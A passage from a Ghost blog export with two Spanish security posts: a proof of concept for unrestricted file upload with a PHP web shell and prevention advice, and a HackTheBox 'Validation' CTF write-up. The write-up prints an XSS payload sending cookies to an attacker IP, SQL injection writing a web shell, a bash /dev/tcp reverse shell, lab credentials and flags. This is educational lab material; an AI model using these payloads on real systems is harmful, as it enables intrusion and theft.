de perfil, por ejemplo. Y esto último abarca un gran número de webs.\"]]],[1,\"p\",[[0,[],0,\"El impacto de una vulnerabilidad de este tipo está catalogado como riesgo alto por la \"],[0,[0],1,\"OWASP \"],[0,[],0,\"(Open Web Application Security Project) foundation, el organismo encargado de apoyar, gestionar y determinar las causas que hacen que el software sea inseguro.\"]]],[1,\"p\",[[0,[],0,\"Pero analicemos más en profundidad qué riesgos puede ocasionarnos una vulnerabilidad de este tipo. A continuación, enumeraré los 2 más los más interesantes a mi parecer:\"]]],[3,\"ol\",[[[0,[],0,\"Ejecución de código remoto en el contexto del cliente, pudiendo robar la cookie de sesión del usuario que accede a ese contenido.\"]],[[0,[],0,\"Ejecución de código remoto en el contexto del servidor (subiendo un archivo en el lenguaje que interprete el servidor).\"]]]],[1,\"p\",[[0,[],0,\"De este último, he preparado una prueba de concepto que servirá para entender mejor el problema al que nos enfrentamos.\"]]],[1,\"h2\",[[0,[],0,\"Unrestricted File Upload Vulnerability\"]]],[1,\"p\",[[0,[],0,\"El código de la prueba se puede descargar del siguiente \"],[0,[1],1,\"link\"],[0,[],0,\". Como siempre, se puede poner en marcha del siguiente modo.\"]]],[10,0],[1,\"p\",[[0,[2],1,\"Analicemos lo que ocurre a continuación\"],[0,[],0,\". \"]]],[1,\"p\",[[0,[],0,\"Estamos ante una aplicación que permite subir imágenes para visualizarlas online, como si se tratase de un álbum de fotos. Esta aplicación se ejecuta en un servidor que interpreta código PHP. Un atacante no tiene por qué conocer esta información, pero es relativamente fácil llegar a esta conclusión analizando el host remoto con una serie de herramientas o incluso, conociendo el CMS que está corriendo.\"]]],[10,1],[1,\"p\",[[0,[],0,\"El ataque consta de 3 pasos:\"]]],[3,\"ol\",[[[0,[],0,\"Preparamos un archivo PHP que contiene el siguiente código.\"]]]],[10,2],[1,\"p\",[[0,[3],1,\"Es gracioso porque Windows me borraba automáticamente el archivo cuando lo estaba creando para hacer la prueba.\"]]],[1,\"p\",[[0,[],0,\"Este código recibe un parámetro \"],[0,[3],1,\"cmd \"],[0,[],0,\"que ejecutará en una consola del sistema y después imprimirá por pantalla el resultado.\"]]],[1,\"p\",[[0,[],0,\"2. Utilizamos el formulario para subir el archivo, ya que el servidor no tiene en cuenta la extensión del mismo. En la web, se generan unos links para acceder a la visualización del contenido.\"]]],[1,\"p\",[[0,[],0,\"3. Como el servidor interpreta el código PHP que hemos introducido, le añadimos un parámetro a la URL que ejecutará el comando que queramos del siguiente modo.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Llegados a este punto, ya hemos obtenido la ejecución remota de código. A partir de este momento podemos enumerar archivos del sistema o simplemente ejecutarnos una shell reversa para navegar por el sistema de archivos.\"]]],[1,\"p\",[[0,[2],1,\"Cosas a tener en consideración:\"]]],[3,\"ul\",[[[0,[],0,\"\"],[0,[],0,\"Si el servidor se estuviese ejecutando como \"],[0,[3],1,\"root\"],[0,[],0,\", tanto los comandos como la shell que obtendríamos estaría en una sesión con todos los privilegios. Game Over. De ahí la importancia de tener un control de privilegios de las tareas que estamos ejecutando.\"]],[[0,[],0,\"Si el servidor estuviese filtrando este tipo de archivos y solo permitiese subir imágenes, pero el backend estuviese empleando alguna librería típica de procesamiento de imágenes como \"],[0,[4],1,\"ImageTragick\"],[0,[],0,\", el servidor sería igualmente vulnerable.\"]],[[0,[],0,\"Esta explotación de la vulnerabilidad es un caso extremo. No limitar el tamaño del archivo que se sube al servidor podría terminar en un ataque \"],[0,[5],1,\"DOS\"],[0,[],0,\" al llenar el almacenamiento total del sistema en caso de no estar alojando los archivos en un almacenamiento de datos Cloud como \"],[0,[6],1,\"S3\"],[0,[],0,\". En este último caso, tu economía podría irse al garete.\"]],[[0,[],0,\"Cualquier lenguaje backend es susceptible de sufrir esta vulnerabilidad. La prueba de concepto con PHP se podría haber hecho con .NET, Java, Javascript, Python y un largo etc.\"]]]],[1,\"h2\",[[0,[],0,\"Y, ¿qué puedo hacer para prevenir esto?\"]]],[1,\"p\",[[0,[],0,\"Son varias las cosas que deberías tener en cuenta como ves en este \"],[0,[7],1,\"link\"],[0,[],0,\", pero los siguientes puntos deberían ser básicos para tu servidor:\"]]],[3,\"ul\",[[[0,[],0,\"El atributo Accept en el html del lado de \"],[0,[8],1,\"cliente\"],[0,[],0,\". Ojo, esto por si solamente no sirve de nada, debe ir acompañado obligatoriamente del siguiente punto.\"]],[[0,[],0,\"Valida el tipo de archivo en el servidor. No te fíes únicamente de la cabecera Content-Type, un usuario podría modificar esto. En el siguiente \"],[0,[9],1,\"enlace \"],[0,[],0,\"tienes un ejemplo de como se haría en PHP, pero básicamente consiste en leer el \"],[0,[10],1,\"MimeType\"],[0,[],0,\" del archivo y mediante una \"],[0,[11],1,\"Whitelist\"],[0,[],0,\", permitir unas extensiones concretas excluyendo automáticamente todas las demás.\"]],[[0,[],0,\"Fija un tamaño límite del archivo. Si es posible, aplica algún tipo de umbral máximo de subida de archivo por cada usuario. No permitas subir archivos sin estar autenticado.\"]],[[0,[],0,\"Almacena los archivos en un lugar externo al servidor que corre la aplicación. En caso de no ser posible, ubica la carpeta de subidas fuera del directorio webroot.\"]],[[0,[],0,\"Utiliza identificadores que se mapeen con cada archivo. Es decir, en el caso de la aplicación de prueba, la forma de acceder al archivo subido no debería ser http://127.0.0.1/php_rce.php, debería ser mediante una URI aleatoria tipo http://127.0.0.1/123456789.\"]],[[0,[],0,\"Protege todos tus formularios de posibles ataques \"],[0,[12],1,\"CSRF\"],[0,[],0,\".\"]]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>El post de hoy va a tratar sobre el riesgo potencial que se crea en aquellas plataformas que permiten a los usuarios subir archivos a través de algún formulario.</p><p>Este tipo de plataformas van más allá que Facebook o Instagram, donde todos tenemos claro que se pueden subir fotos. También estamos hablando de cualquier web que te permite subir una imagen de perfil, por ejemplo. Y esto último abarca un gran número de webs.</p><p>El impacto de una vulnerabilidad de este tipo está catalogado como riesgo alto por la <a href=\"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\">OWASP </a>(Open Web Application Security Project) foundation, el organismo encargado de apoyar, gestionar y determinar las causas que hacen que el software sea inseguro.</p><p>Pero analicemos más en profundidad qué riesgos puede ocasionarnos una vulnerabilidad de este tipo. A continuación, enumeraré los 2 más los más interesantes a mi parecer:</p><ol><li>Ejecución de código remoto en el contexto del cliente, pudiendo robar la cookie de sesión del usuario que accede a ese contenido.</li><li>Ejecución de código remoto en el contexto del servidor (subiendo un archivo en el lenguaje que interprete el servidor).</li></ol><p>De este último, he preparado una prueba de concepto que servirá para entender mejor el problema al que nos enfrentamos.</p><h2 id=\"unrestricted-file-upload-vulnerability\">Unrestricted File Upload Vulnerability</h2><p>El código de la prueba se puede descargar del siguiente <a href=\"https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability\">link</a>. Como siempre, se puede poner en marcha del siguiente modo.</p><pre><code class=\"language-bash\">git clone https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability\ncd Unrestricted-File-Upload-Vulnerability\ndocker-compose up</code></pre><p><strong>Analicemos lo que ocurre a continuación</strong>. </p><p>Estamos ante una aplicación que permite subir imágenes para visualizarlas online, como si se tratase de un álbum de fotos. Esta aplicación se ejecuta en un servidor que interpreta código PHP. Un atacante no tiene por qué conocer esta información, pero es relativamente fácil llegar a esta conclusión analizando el host remoto con una serie de herramientas o incluso, conociendo el CMS que está corriendo.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/ezgif-5-1b4b7d19e3-4.gif\" class=\"kg-image\" alt loading=\"lazy\" width=\"600\" height=\"389\" srcset=\"__GHOST_URL__/content/images/2022/02/ezgif-5-1b4b7d19e3-4.gif 600w\"></figure><p>El ataque consta de 3 pasos:</p><ol><li>Preparamos un archivo PHP que contiene el siguiente código.</li></ol><pre><code class=\"language-php\">&lt;?php\n\techo system($_REQUEST['cmd']);\n?&gt;</code></pre><p><em>Es gracioso porque Windows me borraba automáticamente el archivo cuando lo estaba creando para hacer la prueba.</em></p><p>Este código recibe un parámetro <em>cmd </em>que ejecutará en una consola del sistema y después imprimirá por pantalla el resultado.</p><p>2. Utilizamos el formulario para subir el archivo, ya que el servidor no tiene en cuenta la extensión del mismo. En la web, se generan unos links para acceder a la visualización del contenido.</p><p>3. Como el servidor interpreta el código PHP que hemos introducido, le añadimos un parámetro a la URL que ejecutará el comando que queramos del siguiente modo.</p><pre><code class=\"language-sh\">http://127.0.0.1/php_rce.php?cmd=&lt;command to execute&gt;</code></pre><p>Llegados a este punto, ya hemos obtenido la ejecución remota de código. A partir de este momento podemos enumerar archivos del sistema o simplemente ejecutarnos una shell reversa para navegar por el sistema de archivos.</p><p><strong>Cosas a tener en consideración:</strong></p><ul><li>Si el servidor se estuviese ejecutando como <em>root</em>, tanto los comandos como la shell que obtendríamos estaría en una sesión con todos los privilegios. Game Over. De ahí la importancia de tener un control de privilegios de las tareas que estamos ejecutando.</li><li>Si el servidor estuviese filtrando este tipo de archivos y solo permitiese subir imágenes, pero el backend estuviese empleando alguna librería típica de procesamiento de imágenes como <a href=\"https://imagetragick.com/\">ImageTragick</a>, el servidor sería igualmente vulnerable.</li><li>Esta explotación de la vulnerabilidad es un caso extremo. No limitar el tamaño del archivo que se sube al servidor podría terminar en un ataque <a href=\"https://www.cloudflare.com/es-es/learning/ddos/what-is-a-ddos-attack/\">DOS</a> al llenar el almacenamiento total del sistema en caso de no estar alojando los archivos en un almacenamiento de datos Cloud como <a href=\"https://aws.amazon.com/es/s3/\">S3</a>. En este último caso, tu economía podría irse al garete.</li><li>Cualquier lenguaje backend es susceptible de sufrir esta vulnerabilidad. La prueba de concepto con PHP se podría haber hecho con .NET, Java, Javascript, Python y un largo etc.</li></ul><h2 id=\"y-%C2%BFqu%C3%A9-puedo-hacer-para-prevenir-esto\">Y, ¿qué puedo hacer para prevenir esto?</h2><p>Son varias las cosas que deberías tener en cuenta como ves en este <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html\">link</a>, pero los siguientes puntos deberían ser básicos para tu servidor:</p><ul><li>El atributo Accept en el html del lado de <a href=\"https://developer.mozilla.org/es/docs/Web/HTML/Attributes/accept\">cliente</a>. Ojo, esto por si solamente no sirve de nada, debe ir acompañado obligatoriamente del siguiente punto.</li><li>Valida el tipo de archivo en el servidor. No te fíes únicamente de la cabecera Content-Type, un usuario podría modificar esto. En el siguiente <a href=\"https://dev.to/einlinuus/how-to-upload-files-with-php-correctly-and-securely-1kng\">enlace </a>tienes un ejemplo de como se haría en PHP, pero básicamente consiste en leer el <a href=\"https://developer.mozilla.org/es/docs/Web/HTTP/Basics_of_HTTP/MIME_types\">MimeType</a> del archivo y mediante una <a href=\"https://www.hypr.com/whitelist/\">Whitelist</a>, permitir unas extensiones concretas excluyendo automáticamente todas las demás.</li><li>Fija un tamaño límite del archivo. Si es posible, aplica algún tipo de umbral máximo de subida de archivo por cada usuario. No permitas subir archivos sin estar autenticado.</li><li>Almacena los archivos en un lugar externo al servidor que corre la aplicación. En caso de no ser posible, ubica la carpeta de subidas fuera del directorio webroot.</li><li>Utiliza identificadores que se mapeen con cada archivo. Es decir, en el caso de la aplicación de prueba, la forma de acceder al archivo subido no debería ser http://127.0.0.1/php_rce.php, debería ser mediante una URI aleatoria tipo http://127.0.0.1/123456789.</li><li>Protege todos tus formularios de posibles ataques <a href=\"https://owasp.org/www-community/attacks/csrf\">CSRF</a>.</li></ul>",
            "comment_id": "6200432e23be580061ee8584",
            "plaintext": "El post de hoy va a tratar sobre el riesgo potencial que se crea en aquellas plataformas que permiten a los usuarios subir archivos a través de algún formulario.\n\nEste tipo de plataformas van más allá que Facebook o Instagram, donde todos tenemos claro que se pueden subir fotos. También estamos hablando de cualquier web que te permite subir una imagen de perfil, por ejemplo. Y esto último abarca un gran número de webs.\n\nEl impacto de una vulnerabilidad de este tipo está catalogado como riesgo alto por la OWASP (Open Web Application Security Project) foundation, el organismo encargado de apoyar, gestionar y determinar las causas que hacen que el software sea inseguro.\n\nPero analicemos más en profundidad qué riesgos puede ocasionarnos una vulnerabilidad de este tipo. A continuación, enumeraré los 2 más los más interesantes a mi parecer:\n\n 1. Ejecución de código remoto en el contexto del cliente, pudiendo robar la cookie de sesión del usuario que accede a ese contenido.\n 2. Ejecución de código remoto en el contexto del servidor (subiendo un archivo en el lenguaje que interprete el servidor).\n\nDe este último, he preparado una prueba de concepto que servirá para entender mejor el problema al que nos enfrentamos.\n\n\nUnrestricted File Upload Vulnerability\n\nEl código de la prueba se puede descargar del siguiente link. Como siempre, se puede poner en marcha del siguiente modo.\n\ngit clone https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability\ncd Unrestricted-File-Upload-Vulnerability\ndocker-compose up\n\nAnalicemos lo que ocurre a continuación.\n\nEstamos ante una aplicación que permite subir imágenes para visualizarlas online, como si se tratase de un álbum de fotos. Esta aplicación se ejecuta en un servidor que interpreta código PHP. Un atacante no tiene por qué conocer esta información, pero es relativamente fácil llegar a esta conclusión analizando el host remoto con una serie de herramientas o incluso, conociendo el CMS que está corriendo.\n\nEl ataque consta de 3 pasos:\n\n 1. Preparamos un archivo PHP que contiene el siguiente código.\n\n<?php\n\techo system($_REQUEST['cmd']);\n?>\n\nEs gracioso porque Windows me borraba automáticamente el archivo cuando lo estaba creando para hacer la prueba.\n\nEste código recibe un parámetro cmd que ejecutará en una consola del sistema y después imprimirá por pantalla el resultado.\n\n2. Utilizamos el formulario para subir el archivo, ya que el servidor no tiene en cuenta la extensión del mismo. En la web, se generan unos links para acceder a la visualización del contenido.\n\n3. Como el servidor interpreta el código PHP que hemos introducido, le añadimos un parámetro a la URL que ejecutará el comando que queramos del siguiente modo.\n\nhttp://127.0.0.1/php_rce.php?cmd=<command to execute>\n\nLlegados a este punto, ya hemos obtenido la ejecución remota de código. A partir de este momento podemos enumerar archivos del sistema o simplemente ejecutarnos una shell reversa para navegar por el sistema de archivos.\n\nCosas a tener en consideración:\n\n * Si el servidor se estuviese ejecutando como root, tanto los comandos como la shell que obtendríamos estaría en una sesión con todos los privilegios. Game Over. De ahí la importancia de tener un control de privilegios de las tareas que estamos ejecutando.\n * Si el servidor estuviese filtrando este tipo de archivos y solo permitiese subir imágenes, pero el backend estuviese empleando alguna librería típica de procesamiento de imágenes como ImageTragick, el servidor sería igualmente vulnerable.\n * Esta explotación de la vulnerabilidad es un caso extremo. No limitar el tamaño del archivo que se sube al servidor podría terminar en un ataque DOS al llenar el almacenamiento total del sistema en caso de no estar alojando los archivos en un almacenamiento de datos Cloud como S3. En este último caso, tu economía podría irse al garete.\n * Cualquier lenguaje backend es susceptible de sufrir esta vulnerabilidad. La prueba de concepto con PHP se podría haber hecho con .NET, Java, Javascript, Python y un largo etc.\n\n\nY, ¿qué puedo hacer para prevenir esto?\n\nSon varias las cosas que deberías tener en cuenta como ves en este link, pero los siguientes puntos deberían ser básicos para tu servidor:\n\n * El atributo Accept en el html del lado de cliente. Ojo, esto por si solamente no sirve de nada, debe ir acompañado obligatoriamente del siguiente punto.\n * Valida el tipo de archivo en el servidor. No te fíes únicamente de la cabecera Content-Type, un usuario podría modificar esto. En el siguiente enlace tienes un ejemplo de como se haría en PHP, pero básicamente consiste en leer el MimeType del archivo y mediante una Whitelist, permitir unas extensiones concretas excluyendo automáticamente todas las demás.\n * Fija un tamaño límite del archivo. Si es posible, aplica algún tipo de umbral máximo de subida de archivo por cada usuario. No permitas subir archivos sin estar autenticado.\n * Almacena los archivos en un lugar externo al servidor que corre la aplicación. En caso de no ser posible, ubica la carpeta de subidas fuera del directorio webroot.\n * Utiliza identificadores que se mapeen con cada archivo. Es decir, en el caso de la aplicación de prueba, la forma de acceder al archivo subido no debería ser http://127.0.0.1/php_rce.php, debería ser mediante una URI aleatoria tipo http://127.0.0.1/123456789.\n * Protege todos tus formularios de posibles ataques CSRF.",
            "feature_image": "__GHOST_URL__/content/images/2022/02/Screenshot_6.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-06T21:52:46.000Z",
            "updated_at": "2022-02-09T16:31:25.000Z",
            "published_at": "2022-02-07T20:29:48.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112379",
            "uuid": "73492dae-37c1-431f-b46d-e7c346f1572a",
            "title": "CTF - Validation WriteUp",
            "slug": "ctf-validation",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"bash\",\"code\":\"nmap -p- -sS --open -T5 -vvv -n -Pn -oG allPorts 10.10.11.116\",\"caption\":\"NMAP all ports discovery\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ nmap -p22,80,4566,8080 -sCV -n -Pn 10.10.11.116 -oN targeted\\nPORT     STATE SERVICE VERSION\\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\\n80/tcp   open  http    Apache httpd 2.4.48 ((Debian))\\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\\n|_http-server-header: Apache/2.4.48 (Debian)\\n4566/tcp open  http    nginx\\n|_http-title: 403 Forbidden\\n8080/tcp open  http    nginx\\n|_http-title: 502 Bad Gateway\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/form.png\",\"width\":483,\"height\":213}],[\"code\",{\"language\":\"html\",\"code\":\"<script>alert(\\\"XSS attack\\\");</script>\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/xss.png\",\"width\":588,\"height\":212}],[\"code\",{\"language\":\"html\",\"code\":\"<script>var i=new Image;i.src=\\\"http://10.10.14.14:8080/?\\\"+document.cookie;</script>\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ python -m http.server 8080\\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\\n10.10.14.14 - - [08/Feb/2022 18:39:45] \\\"GET /?user=020fba18d39d4e3bbda3fa8396dd4563 HTTP/1.1\\\" 200 -\"}],[\"code\",{\"language\":\"bash\",\"code\":\"username=anyuser&country='union select \\\"<?php system($_REQUEST['cmd']); ?>\\\" INTO OUTFILE \\\"/var/www/html/shell.php\\\"-- -\"}],[\"code\",{\"language\":\"bash\",\"code\":\"http://10.10.11.116/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F443%200%3E%261%0A\"}],[\"code\",{\"language\":\"sh\",\"code\":\"www-data@validation:/var/www/html$ cat config.php\\n<?php\\n  $servername = \\\"127.0.0.1\\\";\\n  $username = \\\"uhc\\\";\\n  $password = \\\"uhc-9qual-global-pw\\\";\\n  $dbname = \\\"registration\\\";\\n\\n  $conn = new mysqli($servername, $username, $password, $dbname);\\n?>\"}],[\"code\",{\"language\":\"sh\",\"code\":\"www-data@validation: su -\\nuhc-9qual-global-pw\\nroot@validation:~#\"}],[\"code\",{\"language\":\"sh\",\"code\":\"root@validation:~# cat /home/htb/user.txt\\ne4be632da67c582f555571fdfa8135d6\\nroot@validation:~# cat root.txt\\n459129eac316e8f9a522758f2a362493\"}]],\"markups\":[[\"a\",[\"href\",\"https://www.youtube.com/c/ippsec/videos\"]],[\"em\"],[\"a\",[\"href\",\"https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Esta máquina es del creador de contenido de Ciberseguridad \"],[0,[0],1,\"IppSec\"],[0,[],0,\". Podemos encontrar varias máquinas suyas en HTB y suelen ser todas bastante entretenidas.\"]]],[1,\"p\",[[0,[],0,\"En este caso empezamos con el escaneo de puertos.\"]]],[10,0],[1,\"p\",[[0,[],0,\"En mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.\"]]],[1,\"p\",[[0,[],0,\"Descubrimos varios puertos abiertos.\"]]],[10,1],[1,\"p\",[[0,[],0,\"El puerto 8080 devuelve un http status code 502 y el 4566 un 403 forbidden, por lo que nos centramos en el puerto 80.\"]]],[1,\"p\",[[0,[],0,\"En la página principal aparece un formulario donde podemos introducir un nombre y elegir un país.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Parece que al rellenarlo, nos lleva a otra página con la información registrada. Probamos una inyección XSS en el campo \"],[0,[1],1,\"Username \"],[0,[],0,\"y avanzamos.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Pulsamos al botón de Join Now y encontramos lo siguiente.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Una vez que validamos que es vulnerable a ataques XSS, busco el siguiente código en el cheatsheet de \"],[0,[2],1,\"R0B1NL1N\"],[0,[],0,\".\"]]],[10,5],[1,\"p\",[[0,[],0,\"Y tras poner en escucha en nuestro equipo un servidor en el puerto 8080, recibo la siguiente petición. Lo que se ve a continuación soy yo entrando a la página y enviándome mi cookie de sesión \"],[0,[1],1,\"user=020fba18d39d4e3bbda3fa8396dd4563\"],[0,[],0,\". De esta forma verifico que todo funciona correctamente.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Llegados a este punto cualquier usuario que entre a esa página, nos estará enviando su cookie de sesión. Continúo buscando cosas mientras dejo el servidor corriendo aunque ya os adelanto que por ese camino, no voy a conseguir nada más.\"]]],[1,\"p\",[[0,[],0,\"Retomando los pasos previos, intento ver si el formulario es vulnerable a injecciones SQL y veo que el input del país es vulnerable.\"]]],[1,\"p\",[[0,[],0,\"Monto Burpsuite, activo el proxy en mi navegador y modifico los parámetros de la petición /POST de la siguiente manera.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Me pongo en escucha con Netcat en mi máquina en el puerto 443 y realizo una petición a la siguiente URL.\"]]],[10,8],[1,\"p\",[[0,[],0,\"La URL está codificada. El contenido de cmd es bash -i >& /dev/tcp/10.10.14.14/443 0>&1.\"]]],[1,\"p\",[[0,[],0,\"Recibo la shell y lo primero que hago es ver la siguiente configuración en el directorio actual.\"]]],[10,9],[1,\"p\",[[0,[],0,\"Veo las credenciales de MySQL. Podría tratar de enumerar el contenido de la base de datos, pero pruebo por casualidad si soy capaz de ponerme como sudo con la misma contraseña.\"]]],[10,10],[1,\"p\",[[0,[],0,\"Llegados a este punto, tenemos acceso a todo el contenido. Enumero las flags y listo.\"]]],[10,11],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Esta máquina es del creador de contenido de Ciberseguridad <a href=\"https://www.youtube.com/c/ippsec/videos\">IppSec</a>. Podemos encontrar varias máquinas suyas en HTB y suelen ser todas bastante entretenidas.</p><p>En este caso empezamos con el escaneo de puertos.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-bash\">nmap -p- -sS --open -T5 -vvv -n -Pn -oG allPorts 10.10.11.116</code></pre><figcaption>NMAP all ports discovery</figcaption></figure><p>En mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.</p><p>Descubrimos varios puertos abiertos.</p><pre><code class=\"language-sh\">❯ nmap -p22,80,4566,8080 -sCV -n -Pn 10.10.11.116 -oN targeted\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\n80/tcp   open  http    Apache httpd 2.4.48 ((Debian))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.48 (Debian)\n4566/tcp open  http    nginx\n|_http-title: 403 Forbidden\n8080/tcp open  http    nginx\n|_http-title: 502 Bad Gateway\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>El puerto 8080 devuelve un http status code 502 y el 4566 un 403 forbidden, por lo que nos centramos en el puerto 80.</p><p>En la página principal aparece un formulario donde podemos introducir un nombre y elegir un país.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/form.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"483\" height=\"213\"></figure><p>Parece que al rellenarlo, nos lleva a otra página con la información registrada. Probamos una inyección XSS en el campo <em>Username </em>y avanzamos.</p><pre><code class=\"language-html\">&lt;script&gt;alert(\"XSS attack\");&lt;/script&gt;</code></pre><p>Pulsamos al botón de Join Now y encontramos lo siguiente.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/xss.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"588\" height=\"212\"></figure><p>Una vez que validamos que es vulnerable a ataques XSS, busco el siguiente código en el cheatsheet de <a href=\"https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md\">R0B1NL1N</a>.</p><pre><code class=\"language-html\">&lt;script&gt;var i=new Image;i.src=\"http://10.10.14.14:8080/?\"+document.cookie;&lt;/script&gt;</code></pre><p>Y tras poner en escucha en nuestro equipo un servidor en el puerto 8080, recibo la siguiente petición. Lo que se ve a continuación soy yo entrando a la página y enviándome mi cookie de sesión <em>user=020fba18d39d4e3bbda3fa8396dd4563</em>. De esta forma verifico que todo funciona correctamente.</p><pre><code class=\"language-bash\">❯ python -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.10.14.14 - - [08/Feb/2022 18:39:45] \"GET /?user=020fba18d39d4e3bbda3fa8396dd4563 HTTP/1.1\" 200 -</code></pre><p>Llegados a este punto cualquier usuario que entre a esa página, nos estará enviando su cookie de sesión. Continúo buscando cosas mientras dejo el servidor corriendo aunque ya os adelanto que por ese camino, no voy a conseguir nada más.</p><p>Retomando los pasos previos, intento ver si el formulario es vulnerable a injecciones SQL y veo que el input del país es vulnerable.</p><p>Monto Burpsuite, activo el proxy en mi navegador y modifico los parámetros de la petición /POST de la siguiente manera.</p><pre><code class=\"language-bash\">username=anyuser&amp;country='union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" INTO OUTFILE \"/var/www/html/shell.php\"-- -</code></pre><p>Me pongo en escucha con Netcat en mi máquina en el puerto 443 y realizo una petición a la siguiente URL.</p><pre><code class=\"language-bash\">http://10.10.11.116/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F443%200%3E%261%0A</code></pre><p>La URL está codificada. El contenido de cmd es bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1.</p><p>Recibo la shell y lo primero que hago es ver la siguiente configuración en el directorio actual.</p><pre><code class=\"language-sh\">www-data@validation:/var/www/html$ cat config.php\n&lt;?php\n  $servername = \"127.0.0.1\";\n  $username = \"uhc\";\n  $password = \"uhc-9qual-global-pw\";\n  $dbname = \"registration\";\n\n  $conn = new mysqli($servername, $username, $password, $dbname);\n?&gt;</code></pre><p>Veo las credenciales de MySQL. Podría tratar de enumerar el contenido de la base de datos, pero pruebo por casualidad si soy capaz de ponerme como sudo con la misma contraseña.</p><pre><code class=\"language-sh\">www-data@validation: su -\nuhc-9qual-global-pw\nroot@validation:~#</code></pre><p>Llegados a este punto, tenemos acceso a todo el contenido. Enumero las flags y listo.</p><pre><code class=\"language-sh\">root@validation:~# cat /home/htb/user.txt\ne4be632da67c582f555571fdfa8135d6\nroot@validation:~# cat root.txt\n459129eac316e8f9a522758f2a362493</code></pre>",
            "comment_id": "6202a9b323be580061ee8773",
            "plaintext": "Esta máquina es del creador de contenido de Ciberseguridad IppSec. Podemos encontrar varias máquinas suyas en HTB y suelen ser todas bastante entretenidas.\n\nEn este caso empezamos con el escaneo de puertos.\n\nnmap -p- -sS --open -T5 -vvv -n -Pn -oG allPorts 10.10.11.116\n\nEn mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.\n\nDescubrimos varios puertos abiertos.\n\n❯ nmap -p22,80,4566,8080 -sCV -n -Pn 10.10.11.116 -oN targeted\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\n80/tcp   open  http    Apache httpd 2.4.48 ((Debian))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.48 (Debian)\n4566/tcp open  http    